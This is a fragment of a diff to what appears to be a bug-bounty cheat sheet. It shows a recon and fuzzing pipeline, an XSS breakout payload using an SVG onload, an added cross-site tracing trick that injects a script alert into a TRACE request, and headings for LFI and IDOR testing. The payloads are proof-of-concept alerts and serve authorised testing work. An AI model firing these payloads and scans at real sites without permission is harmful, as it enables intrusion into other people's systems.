@@ -638,6 +638,8 @@ Found an admin dashboard in Shodan.
 2- echo https://sub.target.com | waybckurls | grep "\?" | uro | httpx -silent > parameters.txt 
 3- nuclei -l parameters.txt -t fuzzing-templates
 4- You may find xss,sqli,ssrf,open redirect...ext
+
+
 ----------------------------------------------------------------------------------------------
   
   Path traversal to LFI 
@@ -986,6 +988,10 @@ for url in 200_url.txt ; do (python3 paramspider.py -d "${url}");done
 cat filtered_url.txt | kxss	
 
 </Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
+
+in requst try Connection: 
+TRACE / HTTP/1.1		
+close<script>alert()</script> ==> XST 
 ------------------------------------------------------------
 IDOR ::   API
   GO to my account and intercept data then change id 
